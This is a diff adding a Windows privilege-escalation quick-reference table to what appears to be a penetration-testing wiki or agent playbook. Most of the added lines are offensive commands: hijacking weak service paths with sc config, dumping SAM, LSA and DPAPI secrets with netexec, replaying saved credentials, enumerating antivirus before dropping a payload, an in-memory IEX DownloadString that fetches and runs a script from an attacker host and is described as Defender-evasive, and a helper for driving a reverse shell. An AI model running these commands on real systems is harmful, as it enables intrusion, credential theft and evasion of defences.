@@ -19,6 +19,29 @@ Anchors: [[windows-enumeration]], [[netexec]], [[network-services]]
 
 [[netexec]] is the remote-side workhorse even on a standalone box: `--local-auth` cred checks, `--sam`/`--lsa`/`--dpapi` looting, `-M enum_av` before dropping a payload, and the stored-cred loot modules (winscp/putty/rdcman/keepass/eventlog_creds).
 
+## Privesc quick reference (use this, don't hand-roll)
+
+Every command below is a real, tested primitive - the SAME check a hand-rolled enum script would
+reimplement worse. Look the operation up here first; full context for each lives in the numbered
+methodology step.
+
+| Vector | Command | Step |
+|---|---|---|
+| Token privileges | `whoami /priv` | 2 |
+| Weak service DACL | `accesschk -uwcqv <user> *` | 3 |
+| Reconfigure a weak-DACL service | `sc qc <svc>` then `sc config <svc> binPath= "<cmd>"` | 3 |
+| Registry autologon creds | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` | 4 |
+| Scheduled tasks (SYSTEM-run, writable action/script) | `schtasks /query /fo LIST /v` | 5 |
+| Writable-file sweep (files) | `accesschk.exe /accepteula -uwqs <user> C:\` | 6 |
+| Writable-file sweep (dirs) | `accesschk.exe /accepteula -uwdqs <user> C:\` | 6 |
+| AlwaysInstallElevated (check both hives) | `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` (+ same under `HKCU`) | 7 |
+| Credential loot (saved creds) | `cmdkey /list` (+ replay with `runas /savecred /user:<user> <cmd>`) | 9 |
+| Local-auth cred check + SAM/LSA/DPAPI loot | `nxc smb <target> -u <user> -p <pass> --local-auth --sam --lsa --dpapi` | Wiki |
+| AV/EDR enum before dropping a payload | `nxc smb <target> -u <user> -p <pass> -M enum_av` | Wiki |
+| Stored-cred loot module (swap winscp/putty/rdcman/keepass/eventlog_creds) | `nxc smb <target> -u <user> -p <pass> -M winscp` | Wiki |
+| In-memory enum (Defender-evasive winPEAS/PrivescCheck) | `IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/winPEAS.ps1')` | Exec channel, 1 |
+| Drive the reverse shell (one command per call, no markers) | `bash scripts/win-rsh.sh <eng> '<one command>'` | Exec channel |
+
 ## Attack surface
 
 Local-to-SYSTEM levers: token privileges, service misconfig, autologon creds, scheduled-task / writable-script abuse, DLL hijack, AlwaysInstallElevated, UAC bypass, credential loot.
